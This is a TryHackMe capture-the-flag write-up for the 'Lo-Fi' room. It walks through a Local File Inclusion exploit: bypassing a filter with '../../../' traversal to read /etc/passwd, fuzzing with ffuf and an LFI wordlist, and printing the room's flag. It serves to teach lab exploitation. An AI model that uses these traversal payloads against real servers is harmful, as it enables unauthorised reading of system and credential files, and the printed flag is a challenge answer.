# Lo-Fi - TryHackMe

## Challenge Information

- Platform: TryHackMe
- Room: Lo-Fi
- Category: Web / Local File Inclusion (LFI)

## Objective

Obtain the flag by exploiting a vulnerability in the target web application.

## Reconnaissance

During initial interaction with the web application, a `page` parameter was identified:

    http://10.64.178.103/?page=<value>

This parameter appeared to be used for including or loading files, making it a potential target for Local File Inclusion (LFI) testing.

## Enumeration

### Initial LFI Test

A classic LFI payload was tested:

    http://10.64.178.103/?page=/etc/passwd

Instead of returning the requested file, the application responded with:

    HACKKERRR!! HACKER DETECTED. STOP HACKING YOU STINKIN HACKER!

### Observation

The application appeared to detect obvious LFI payloads rather than simply rejecting invalid requests.

### Analysis

This suggested that some form of blacklist or pattern-based filtering was in place. Rather than concluding that LFI was impossible, the next step was to fuzz the parameter using a collection of known traversal payloads.

## Exploitation

### Fuzzing for LFI Bypass

An LFI-specific wordlist from SecLists was used with `ffuf`:

    ffuf -w "/usr/share/dict/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt" \
         -u "http://10.64.178.103/?page=FUZZ" \
         -fl 124

The `-fl 124` option filtered responses matching the known "HACKER DETECTED" page, allowing successful payloads to stand out.

One successful payload was:

    ../../../etc/passwd

Request:

    http://10.64.178.103/?page=../../../etc/passwd

The application successfully returned the contents of `/etc/passwd`, confirming that directory traversal bypassed the application's filtering.

Example output:

    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/bin/sh
    ...
    www-data:x:33:33:www-data:/var/www:/bin/sh
    ...

## Analysis

The testing confirmed a Local File Inclusion vulnerability.

Although direct access to `/etc/passwd` was detected and blocked, the application failed to properly sanitize directory traversal sequences. By traversing directories with `../../../`, arbitrary readable files on the server became accessible.

Since the challenge description indicated that the flag resided within the root filesystem, the same technique was applied to retrieve the flag file.

## Flag Retrieval

The following payload was used:

    http://10.64.178.103/?page=../../../flag.txt

The application returned the flag, successfully completing the challenge.

## Flag

The flag was successfully obtained.

    flag{e4478e0eab69bd642b8238765dcb7d18}

## Lessons Learned

- A blocked or filtered payload does not necessarily indicate that an LFI vulnerability is absent.
- Blacklist-based protections are often bypassable using alternative traversal payloads.
- Fuzzing with curated payload lists can efficiently identify working traversal sequences.
- Filtering known response sizes in `ffuf` reduces noise and highlights successful payloads.

## Key Takeaways

- Identify parameters responsible for loading files.
- Test simple LFI payloads before assuming stronger mitigations exist.
- Use automated fuzzing when manual payloads are blocked.
- Validate successful LFI by reading a known file such as `/etc/passwd`.
- Leverage confirmed arbitrary file reads to retrieve sensitive files required by the challenge.
